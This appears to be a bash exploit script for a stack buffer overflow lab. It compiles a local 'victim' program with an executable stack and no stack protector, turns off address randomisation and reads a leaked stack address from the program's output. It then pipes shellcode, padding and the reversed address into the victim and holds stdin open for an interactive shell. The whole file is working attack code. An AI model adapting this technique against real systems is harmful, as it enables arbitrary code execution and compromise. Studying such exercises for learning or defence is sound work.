#!/bin/bash
gcc -z execstack -fno-stack-protector -o victim victim.c
echo batman | setarch $(uname -m) -R ./victim > output
a=`printf %016x $(sed -n 1p < output) | tac -rs..`
rm output
( ( cat shellcode ; printf %080d 0 ; echo $a ) | xxd -r -p ; cat ) | setarch $(uname -m) -R ./victim
